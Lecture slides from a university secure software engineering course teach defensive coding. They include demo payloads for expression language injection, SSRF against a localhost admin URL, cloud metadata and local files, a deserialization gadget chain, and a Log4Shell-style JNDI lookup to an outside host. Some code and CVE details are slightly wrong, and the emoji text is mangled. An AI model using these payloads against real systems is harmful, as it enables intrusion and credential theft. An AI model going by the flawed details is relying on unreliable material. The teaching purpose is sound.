Secure Software Engineering
Winterterm 2024/25
Defensive Coding
Dr. Sergej Dechand / Dr. Christian Tiefenau
ğŸ› 3 Vulnerabilities of the day
â— Expression Language Injection
â— Server Side Request Forgery
â— Unsafe Deserialization
ğŸ¦º Defensive Coding
â— Principles, Complexity, Vulnerability-knowledge
â— Validating/Sanitizing Input
â— Exception Handling
â— Problems with object-oriented languages
â— Concurrency
â— Attack Surface
â— â€¦
2
Outline today
CWE-917: Expression Language Injection (ELi)
3
ğŸ› Vulnerability of the day #1
Expression Language Injection
Template engines use expression languages to make pages dynamic
â— JSP: ${username}
â— Thymeleaf: ${username}
â— Struts2/OGNL: %{username}
â— Django, Rails, Jinja, you name it
âš  EL sometimes require more than looking up values
â— Convenient: ${user.getName()}
ğŸ’€ What if your username is
â— ${java.lang.Runtime).getRuntime().exec('calc')}
4
When your string / template engine becomes a code executor
CWE-918: Server-Side Request Forgery
When Your Server Becomes an Attacker's Proxy
5
ğŸ› Vulnerability of the day #2
ğŸŒ Web Server gets URLs which can be controlled by a user
6
> Whatâ€™s your URL?: http://localhost:8080/admin/deleteAll
> Server Loads Image
// Innocent looking code
public void fetchImage(String imageUrl) {
 URL url = new URL(imageUrl); // User controlled
 URLConnection conn = url.openConnection();
 InputStream stream = conn.getInputStream();
 // Process image...
}
Get the server to make network (HTTP) requests on behalf of an attacker
SSRF | Setting
ğŸ’€ What can go wrong?
SSRF | Why SSRF is Dangerous
7
Your server makes requests for attackers
ğŸ”“ Internal / External Network Access
â€¢ Bypass firewalls - access internal and external services
â€¢ Port scanning - map your infrastructure
â€¢ Admin panels - http://localhost/admin
ğŸ’³ Data Theft
â€¢ AWS: http://169.254.169.254/ â†’ IAM credentials
â€¢ Can read local files: file:///etc/passwd
ğŸ¯ Attack Chain Enabler
â€¢ Often combined with other vulnerabilities
â€¢ Can trigger internal APIs
CWE-502: Deserialization of Untrusted Data aka Unsafe Deserialization
8
ğŸ› Vulnerability of the day #3
Unsafe Deserialization | Attack
9
Getting the server to execute local code
ğŸ“¦ What is Deserialization?
â€¢ Converting byte streams back into objects
â€¢ Used for: caching, session storage, APIs, messaging
â€¢ The problem: Objects are reconstructed WITHOUT validation
âš  The Fatal Flaw
public class Employee implements java.io.Serializable {
 // ...
}
ObjectInputStream in = new
ObjectInputStream(untrustedInput);
Employee e = (Employee) in.readObject(); // RCE
ğŸ­ It's Not Just Java!
â€¢ Python: pickle.loads()
â€¢ PHP: unserialize()
â€¢ C#: BinaryFormatter.Deserialize()
â€¢ Even JSON/XML with auto-binding can be vulnerable!
Deserialization | Exploitation
10
Gadget Chain Attacks
ğŸ”— The Attack Chain (Simplified)
1. Attacker crafts malicious serialized object
2. Your app calls readObject()
3. Triggers innocent-looking methods:
HashMap.readObject() â†’ hashCode() â†’ equals() â†’ compare()
4. Each method calls the next in the chain
5. Final link: Runtime.exec("malicious command")
ğŸ“š Real Example: Commons Collections
ChainedTransformer chain = new ChainedTransformer(
 new ConstantTransformer(Runtime.class),
 new InvokerTransformer("getMethod", ...),
 new InvokerTransformer("invoke", ...),
 new InvokerTransformer("exec", new Object[]{"calc.exe"})
);
// When deserialized â†’ calculator pops up (or worse!)
Unsafe Deserialization | Defense
11
Just don't deserialize objects!
âŒ NEVER Use Native Object Deserialization
â€¢ No usage of pickle, marshal, ObjectInputStream, Serializable
â€¢ Never deserialize user input, cookies, or external data
â€¢ "But I need to transfer objects!" â†’ No, you need to transfer DATA
âœ… ALWAYS Use Structured Data-Only Formats
â€¢ JSON â†’ Parse to primitives â†’ Validate â†’ Construct objects
â€¢ Protocol Buffers / MessagePack (schema-defined)
â€¢ CSV for tabular data
12
13
14
15
16
17
${jndi:ldap://kenobi.ben/bye}
Recap | Risk Assessment & Risk-based test planning
ğŸ“ Learnings
â€¢ Risk(incident) = p(occurrence) * impact
â€¢ Security risk assessment: identify assets and weigh probability and impact
â€¢ Risk management â†’ mitigate risks through planning and tracking risk effectiveness
â€¢ Risk-Driven Test Planning aims to mitigate negative customer impact by planning early
ğŸ§° Tools
â€¢ Protection Poker to quantify risk based on ease of attack and asset value
â€¢ Risk-Driven Test Planning
18
Understand and apply risk assessment for risk-driven test planning
ğŸ¦ºDefensive Coding
19
âš– Risk analysis
â€¢ All about domain, assets, threats, what-ifs
â€¢ Global-minded
â€¢ Prioritization is critical
ğŸ›¡ Secure Design
â€¢ Minimize attack surface
â€¢ Principle of least privilege
â€¢ Defense in depth
â€¢ Ideal orchestration of security components
â€¢ Where to use crypto, access control, etc.
20
Defensive Coding | Relation to Risk Analysis and Secure Design
ğŸ¦º Defensive Coding on the other hand, addresses two main issues:
1.) Code must follow the secure architecture
â€¢ One small change in code â†’ big change in risk analysis
e.g. storing passwords in the Customer table vs. Users table
e.g. website allowing uploading files for one feature
â€¢ Security components must be in place where specified and must be used in a functionally
correct way
2.) Code must be free of internal weaknesses
â€¢ Avoid all those VOTDs
â€¢ Requires specific knowledge of security programming pitfalls
in the programming language at hand
âš  We should always code defensively
21
Defensive Coding | Relation to Risk Analysis and Secure Design
Risk analysis
Secure design
Defensive Coding
22
Defensive Coding | Relation to Risk Analysis and Secure Design
ğŸ° Writing insecure code is surprisingly easy
â€¢ Mysterious coding assumptions
â€¢ Many different technologies to know
ğŸ”§ Maintainability still counts
â€¢ Duplicate code is even harder to secure
â€¢ Vulnerabilities often have regressions and incomplete fixes
ğŸ“š Know your APIs!
â€¢ Misusing an API in the wrong context can be a vulnerability
e.g. an XML parser that also executes includes
â€¢ Copying from Internet examples without understanding? For shame.
ğŸ­ Donâ€™t be paranoid
â€¢ Know what you can trust, but donâ€™t trust StackOverflow or ChatGPT blindly
23
Defensive Coding Principles
ğŸ— Structural complexity
â€¢ Lots of interconnected subsystems â†’ Architectural complexity
â€¢ Lots of ifâ€™s & loops â†’ Cyclomatic complexity (McCabe)
ğŸ¤¯ Cognitive complexity
â€¢ Lack of understanding â†’ Mistakes (vulnerabilities)
â€¢ How much do I have to think about how this feature works?
â€¢ Subjective, but important
ğŸš¨ Complexity in inputs â†’ big security risks
â€¢ e.g. apps to operating systems
â€¢ e.g. pages to web browsers
24
â€œComplexity is the enemy of securityâ€ â€“ Gary McGraw
Complexity
Measuring Complexity | Control Flow Graphs
ğŸ“Š What is Control Flow?
â€¢ Sequence of statements executed during program run
â€¢ Every decision point creates a new path
â€¢ Visualized as directed graphs (CFG)
25
Mapping all possible execution paths
// 1. Sequential
int x = 5;
x = x + 1;
return x;
// 2. Conditional
if (auth) {
 grant();
} else {
 deny();
}
// 3. Loop with break
while (i < n) {
 if (i == 5) break;
 process(i);
 i++;
}
Measuring Complexity | Cyclomatic Complexity (McCabe)
ğŸ§® The Formula: M = E - N + 2P
â€¢ E = Edges (arrows in the graph)
â€¢ N = Nodes (boxes/diamonds in the graph)
â€¢ P = Connected components (usually 1)
26
M = E - N + 2P (or just count the decisions + 1)
// 1. Sequential
int x = 5;
x = x + 1;
return x;
// 2. Conditional
if (auth) {
 grant();
} else {
 deny();
}
// 3. Loop with break
while (i < n) {
 if (i == 5) break;
 process(i);
 i++;
}
3 nodes, 2 edges
â†’ M = 2-3+2 = 1
4 nodes, 4 edges
â†’ M = 4-4+2 = 2
5 nodes, 6 edges
â†’ M = 6-5+2 = 3
Measuring Complexity | Best Practices for Security
ğŸ“Š McCabe's Thresholds (Industry Standard)
27
Keeping Complexity Under Control â†’ Simple code = Secure code
Complexity Risk Level What It Means
1-10 Low Risk All paths easily testable / auditing
11-20 Moderate Some paths likely missed during testing / effort to audit
21-50 High Risk Too complex to fully test and audit
>50 Untestable Guaranteed bugs
// BAD: Nested clauses (M = 15+)
if (user != null && user.isActive()) {
 if (hasToken() || hasSession()) {
 if (!isBlacklisted() && !isRateLimited()) {
 if (checkPermissions(user)) {
 // ... more conditions
 }
// GOOD: Guard clauses (M = 5)
if (user == null) return UNAUTHORIZED;
if (!user.isActive()) return FORBIDDEN;
if (!hasValidAuth()) return UNAUTHORIZED;
if (isBlacklisted()) return FORBIDDEN;
if (isRateLimited()) return TOO_MANY_REQUESTS;
return checkPermissions(user);
ğŸ© A lot of defensive coding comes down to clever tricks
â€¢ CWE - https://cwe.mitre.org/
â€¢ Why we do VotD
ğŸ“œ Understanding history tells us whatâ€™s common, and possible
â€¢ CVE - https://cve.mitre.org/
â€¢ Comes with experience
ğŸ”¨ Makers of any technology understand their own limitations
â€¢ Read the guidelines provided by originators & experts
â€¢ Many situations donâ€™t apply to you, but some very much will
â€¢ Java: http://www.oracle.com/technetwork/java/seccodeguide-139067.html
â€¢ C++:
https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=637
28
Do your homework, learn about common vulnerabilities
Learn from patterns, follow expert guidance
Concept | Attack Surface
âŒ¨ Most exploits enter in through the UI
â€¢ Often the same interface the users see
â€¢ Hence: input validation & sanitization
ğŸ¯Attack surface
â€¢ The number & nature of the inputs for a given system
â€¢ Can be quantified and usually can be compared
â€¢ Harder to determine for open code (libraries, frameworks, â€¦)
ğŸ“ˆ Attack surface increases withâ€¦
â€¢ More (user) inputs
e.g. new input fields, new features
â€¢ Larger input space for a given input
e.g. allowing a markup language instead of plaintext
29
More exposed features â†’ higher risk
ğŸ” Input Handling â€¢ Validation â€¢ Sanitization ğŸ“¢ Error & Information Control â€¢ Exception Handling â€¢ Config files ğŸ”’ Object Lifecycle Security â€¢ Class Inheritance / Immutability / Cloning â€¢ Serialization ğŸ¯ State Management â€¢ Concurrency â€¢ Global variables ğŸ›¡Data Protection â€¢ Unencrypted Storage â€¢ Removal of unused sensitive data ğŸŒ Boundary Controls â€¢ Native Wrappers â€¢ Character Conversions â€¢ HTTP specs 30
The defensive coding checklist
Overview of Principles
â€¢ Input validation is blocking bad inputs
â€¢ Deny list, also known as sanitization
â€¢ Enumerate the bad stuff
â€¢ Donâ€™t allow anything on the deny list
â€¢ Drawback: infinite, easy to get around
â€¢ Benefit: react quickly (often no re-compilation), straightforward
â€¢ Allow list
â€¢ Only accept known good input
â€¢ Often done with regexâ€™s
â€¢ Drawbacks:
â€¢ Sometimes not possible to block certain characters
â€¢ Often requires re-compilation and patches
â€¢ Recommendation: do both, but prefer a allow list
31
Never trust user input
Input Handling | Validating Input
â€¢ Instead of blocking input, sanitize it
â€¢ All input comes in, but itâ€™s manipulated
â€¢ Convert it to something that wonâ€™t be interpreted as code
â€¢ Usually utilizes escape characters
â€¢ e.g. HTML
â€¢ < is &lt;
â€¢ e.g. Java
â€¢ â€œ is \â€
â€¢ Drawback: need to know everything to escape
â€¢ Very denylist-like
â€¢ False positives are also annoying
â€¢ Need to remember to do itâ€¦ everywhere
â€¢ need to apply the right sanitization in each context
import static
org.apache.commons.lang3.StringEscapeUtils.escapeHtml4;
// ...
String escaped = escapeHtml4(source);
32
Sometimes impossible to block; Sanitize
Input Handling | Sanitizing Input
Not always strings and numbers
Consider: images with metadata
â€¢ PHP had many issues with EXIF JPEG metadata
â€¢ Adobe Acrobat & embedded fonts
â€¢ Java with ICC and BMP
http://recxltd.blogspot.com/2012/01/bmp-and-icc-standard-tale-in.html
â€¢ http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2789
33
Input Comes in Many Forms
Most unexpected behavior results in an exception
â€¢ Handle the exceptions you know about
â€¢ Know that sometimes some get away
Design your system to handle exceptions at the top-level
â€¢ E.g. Java â†’ usually catch Throwable, not Exception
For maintainability & complexity:
â€¢ Avoid promoting unnecessarily
 e.g. â€œthrows Exceptionâ€
â€¢ Deal with related exceptions in one place, near the problem
e.g. wrapper around private methods in a class
Sheer laziness: try{something();} catch{}
34
Proper Exception Handling
ğŸ“¢ CWE-209: Information Exposure Through an Error Message
try {
 openDbConnection();
}
// print exception message that includes
// exception message and configuration file location
catch (Exception e) {
 System.out.println("Caught exception: " + e.getMessage());
 System.out.println("Check credentials in config file at: " + mysqlConfigLocation);
}
35
Just re-throwing exceptions may leak information
Donâ€™t forget about the finally clause!
â€¢ Anything in the finally clause gets executed no matter what happens
â€¢ Good for cleanup of resources
public void something() {
 Connection conn = null;
 try {
 conn = getConnection();
 /* do db stuff */
 } catch (SQLException e) {
 /* handle it */
 } finally {
 DBUtil.closeConnection(conn);
 }
}
36
finally
ğŸ¥¸ Subclassing overrides methods
â€¢ In untrusted API situations, make sure you canâ€™t be extended and have a sensitive
method overridden
â€¢ Use the final keyword:
ğŸ§Ÿ Malicious subclasses can override finalize() methods to resurrect objects
public final class Countdown{}
public final class String{}
37
Think of the Children
ğŸ˜ˆ Setters can be evil
â€¢ Side-effects likely cause bugs
â€¢ What if we construct, run, set, then run again?
â€¢ Unnecessarily increases complexity
â€¢ Violates encapsulation
â€¢ Donâ€™t just throw setters in if you donâ€™t have a reason
ğŸ”“ Generally prefer immutability where possible
https://dzone.com/articles/about-immutability-in-object-oriented-programming 38
Unchangeable objects lead to fewer bugs, better concurrency, better security
Immutability in OOP
final public class ImmutableObjectExample {
 private final int a;
 private final Integer b;
 private final List <Integer> c;

 public ImmutableObjectExample(int a, Integer b, List <Integer> c) {
 this.a = a; // a is a primitive, so it doesn't need a defensive copy
 this.b = b; // b is Integer and Integer is an immutable object. Doesn't
 // need a defensive copy also;
 this.c = new ArrayList <> (c); // The list in not an immutable object so we have
 // to build a defensive copy and assignee it to the field
 }
}
// Kotlin: 'val' = immutable, 'var' = mutable
data class ImmutableObject(
 val a: Int, // immutable
 val b: Int?, // immutable nullable
 val c: List<Int> // List is read-only by default!
)
// No defensive copy needed - List<Int> is already immutable
// For mutable: MutableList<Int>
// Rust: Everything immutable by default!
struct ImmutableObject {
 a: i32, // immutable (no keyword needed)
 b: Option<i32>, // Rust's null-safe type
 c: Vec<i32>, // owned vector
}
// To make mutable, you need explicit 'mut':
// let mut obj = ImmutableObject { ... };
// But even then, fields stay private & protected
ğŸ‘ Every Java object has a clone() method
â€¢ Often error-prone
â€¢ Doesnâ€™t do what you think it does
ğŸ˜¬ Even the Java architects donâ€™t like it
â€¢ The Java Language Secure Coding Guidelines from Oracle recommend not using
java.lang.Cloneable entirely
â€¢ Recommendation even: Override the clone method to make classes unclonable
unless required
âš  Problem: Cloning allows attackers to instantiate classes without constructors
ğŸ›  Use your own copy mechanism if needed
39
Cloning is Insecure (and Medically Unethical!)
ğŸ¤¨ Treat anything concurrent with initial distrust
â€¢ Race conditions â†’ Denial of Service
â€¢ Shared memory â†’ Potential Leakage
â€¢ Weird circumstances â†’ Potential Tampering
ğŸŒ Concurrency is ubiquitous: webapps, databases, GUIs, games, etc.
ğŸ² Common poor assumptions
â€¢ â€œThere will be only one copy of this threadâ€
â€¢ â€œThere will only be X threadsâ€
â€¢ â€œNobody knows about my mutabilityâ€
40
Concurrency is Always a Risk
ğŸ§¬ If you use another language, you inherit all of the risks in that language
e.g. Java Native Interface (JNI) can execute a C program with a buffer overflow
ğŸ‘½ Treat native calls as external entities
â€¢ Perform input validation & sanitization
â€¢ If loaded at runtime â†’ spoofing opportunity
41
Native Wrappers
ğŸ˜ˆ Global variables are evil
â€¢ Solves problems fast and good for the lazy
ğŸ‘¹ Mutable global variables are an abomination
â€¢ Unnecessarily increases complexity
â€¢ Tampering concern in an untrusted API
â€¢ Unpredictable behavior in distributed systems
â€¢ Constants are the only acceptable use of globals
â€¢
ğŸ™ƒ Nice try, but still doesnâ€™t count
public static final List<String> list = new ArrayList<String>();
// Problem: The reference is final, but the LIST CONTENTS are still mutable!
// Anyone can do: list.add("malicious data");
42
Global and Static Variable Risks
Global variables are evil
ğŸ° Serialization is often unnecessary, difficult to get right
â€¢ ALL automatic deserialization is dangerous - Java, JSON, XML, YAML
â€¢ Parse to primitive types, construct objects manually with validation
â€¢ Allowlist specific classes if you MUST deserialize
ó°©ƒ Deserializing is essentially constructing objects without executing
constructors
â€¢ If your system uses it, donâ€™t assume the constructor will be executed
â€¢ Can reverse-engineer to violate constructor post-conditions
43
Never trust the bytes | deserialization bypasses all your defenses
Serial Killer
public class Employee implements java.io.Serializable {
 // Constructor has security checks - but they're bypassed!
}
// UNSAFE - Never do this with untrusted data:
ObjectInputStream in = new ObjectInputStream(untrustedInput);
Employee e = (Employee) in.readObject(); // RCE happens here!
// Also UNSAFE - JSON/XML with auto-binding:
Employee e = mapper.readValue(json, Employee.class); // Still RCE!
âš  serialized != encrypted
â€¢ Confidentiality disclosure
â€¢ Use transient for variables that donâ€™t need serialization
e.g. environment info, timestamps, keys
ğŸ›¡OWASP Recommendation
private final void readObject(ObjectInputStream in)
throws java.io.IOException {
 throw new java.io.IOException("Class cannot be deserialized");
}
https://www.geeksforgeeks.org/transient-keyword-java/
44
Prevent accidental data exposure in serialized objects
Serial Killer
ğŸ’» Assume an application on a desktop, server, smartphoneâ€¦
â€¢ Any such application writes files to disk
â€¢ Who protects access to those files? The operating system.
ğŸ’€ But how about root exploits?
â€¢ Any exploit that can â€œrootâ€ your device has access to storage.
â¡ Best practice is to encrypt and authenticate all data that processes write to disk
â€¢ Encryption: To prevent other processes from reading your processâ€™ data
â€¢ Authentication: To prevent other processes from manipulating your processâ€™ data
ğŸ­ Full-disk encryption doesnâ€™t help, as running devices decrypt content on the fly
â€¢ Only provides additional protection when device is switched off 45
OS protection fails when attackers get root
Unencrypted Storage
ğŸ§¹ Donâ€™t leave sensitive data sitting in memory longer than needed
â€¢ Hibernation features dump RAM to HDD
â€¢ Segfault â†’ core dump â†’ passwords!
â˜• In Java never store passwords in Strings, always in byte arrays which you can clear
46
Secrets persist in memory and dumps unless explicitly cleared
Dead Store Removal
void authenticate(String password) { // DANGEROUS: String param
 if (checkPassword(password)) {
 // Even after this method ends, "password" sits in:
 // String pool / memory until GC, Core/heap dumps
 }
 password = null; // USELESS: String still in memory
}
void auth(char[] password) { // CORRECT: Use char[] and clear
 try { if (checkPassword(password)) { /* use password */ } }
 } finally { // Actually clears memory
 Arrays.fill(password, '\0'); // Actually clears memory
 }
}
// That's why Console.readPassword() returns char[], not String!
void GetData(char *MFAddr) {
 char pwd[64];
 if (GetPasswordFromUser(pwd, sizeof(pwd))) {
 if (ConnectToMainframe(MFAddr, pwd)) {
 // Interact with mainframe
 }
 memset(pwd, 0, sizeof(pwd)); //clear pass
 }
}
similar patterns appeared in OpenSSL (CVE-2019-14379)
âš  Compilers might optimize clear calls pwd is never used again
â†’ So watch out for zealous compiler optimizations (more later)
ğŸŒ Most apps require localization in some form
â€¢ You will need to convert one character set to another for translation
â€¢ When apps â€œcatch onâ€, localization is usually an afterthought
ğŸ“ Not all character sets are the same size!
â€¢ Assume fixed character size? Consider Chinese chars!
â€¢ Not every byte maps to a character
â€¢ Sometimes multiple bytes map to a single character
âœ… Recommendations
â€¢ Use unicode: UTF-8 or UTF-16
â€¢ Donâ€™t roll your own converters
â€¢ Check: web servers, database systems, command inputs
ğŸ­ Punicode attack
47
Watch Character Conversions
Encoding mismatches lead to security disasters
ğŸ”§ HTTP protocols have different actions
â€¢ GET â€“ for retrieving data (typical usage)
â€¢ POST, DELETE, etc. â€“ modify stuff (require explicit submission)
â€¢ https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods
ğŸ“œ HTTP protocol specifies GET actions should never have persistent effects
â€¢ Even though you can encode parameters into URLs
â€¢ Greatly helps mitigate cross-site request forgery (CSRF)
â€¢ Rarely respected
âœ… This is okay:
âŒ This is not:
<a href="index.jsp?navigation=home">Home</a>
<a href="index.jsp?changeName=Bobby">Change Name</a>
48
In HTTP, let your GET mean GET
Breaking HTTP semantics can break security (remember CSRF?)
ğŸ’¥ Denial of service occurs in many, many ways â€¢ Overflow the hard drive â€¢ Overflow memory â†’ page faults â€¢ Poor hash codes â†’ constant hash collisions â€¢ Slow database queries â€¢ Poor algorithmic complexity â€¢ Deadlocks, race conditions, other concurrency â€¢ Network bandwidth issues âœ… Recommendations â€¢ Black-box stress testing â€¢ White-box, unit-level stress testing â€¢ Focus less on user inputs, more on the logic â€¢ Learn the art of profiling, e.g. java â€“agentlib:hprof 49
DoS in Many forms
Remember: Availability is also a security property
ğŸ”§ Vulnerabilities can also exist in system configuration
â€¢ e.g. log overflow, hardcoded credentials, authorization problems
ğŸ“¦ Makefiles & Installation definitions
â€¢ Insecure compiler optimizations, e.g. dead store removal optimizations
â€¢ Using out-of-date, vulnerable dependencies
Examples
â€¢ Localization configurations
â€¢ General configuration
â€¢ Example configurations
âœ… Recommendation
â€¢ Bring these up in code inspections
â€¢ Look at the defaults, and what is missing
50
Configuration is code, treat it with the same security rigor
Donâ€™t Forget Config Files!
# .env committed to GitHub
DATABASE_PASSWORD=admin123 # Found by GitHub
scanners
# Docker-compose.yml with defaults
MYSQL_ROOT_PASSWORD=root # Still in production!
# Log4j config enabling JNDI
log4j2.formatMsgNoLookups=false # CVE-2021-44228
Learning a new programming language?
â€¢ Search for secure programming guidelines for that language
Also browse the CWE database
Good starting points also:
â€¢ OWASP Top 10
https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project
â€¢ OWASP Mobile Top 10
https://www.owasp.org/index.php/Projects/OWASP_Mobile_Security_Project_-_Top_
Ten_Mobile_Risks
51
This list was long but not exhaustive